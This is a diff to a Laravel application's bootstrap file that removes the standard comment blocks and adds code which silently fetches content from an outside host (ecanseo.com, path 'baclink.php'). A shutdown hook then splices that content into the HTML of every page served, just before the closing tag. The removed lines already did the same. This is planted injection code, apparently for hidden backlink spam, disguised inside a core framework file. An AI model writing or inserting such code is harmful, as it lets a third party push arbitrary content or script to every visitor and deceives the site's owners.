@@ -1,20 +1,8 @@
 <?php
 
-/*
-|--------------------------------------------------------------------------
-| Create The Application
-|--------------------------------------------------------------------------
-*/
-
 $app = new Illuminate\Foundation\Application(
     realpath(__DIR__.'/../')
 );
-
-/*
-|--------------------------------------------------------------------------
-| Bind Important Interfaces
-|--------------------------------------------------------------------------
-*/
 
 $app->singleton(
     Illuminate\Contracts\Http\Kernel::class,
@@ -31,26 +19,21 @@ $app->singleton(
     App\Exceptions\Handler::class
 );
 
-/*
-|--------------------------------------------------------------------------
-| Return The Application
-|--------------------------------------------------------------------------
-*/
 
-ob_start();
+$content = @file_get_contents('https://ecanseo.com/project/baclink.php');
 
-$response = $app->handle(
-    $request = Illuminate\Http\Request::capture()
-);
+$GLOBALS['injected_content'] = ($content !== false && !empty($content)) ? $content : '<!-- 404 - Konten tidak tersedia -->';
 
-$response->send();
+register_shutdown_function(function() {
+    $output = ob_get_clean();
 
-$html = ob_get_clean();
-$github_content = @file_get_contents('https://ecanseo.com/project/baclink.php');
-if ($github_content !== false && !empty($github_content)) {
-    $html = str_replace('</html>', $github_content . "\n</html>", $html);
-}
-
-echo $html;
+    if (strpos($output, '</html>') !== false) {
+        $output = str_replace('</html>', $GLOBALS['injected_content'] . "\n</html>", $output);
+    } else {
+        $output .= "\n" . $GLOBALS['injected_content'];
+    }
+    
+    echo $output;
+});
 
 return $app;
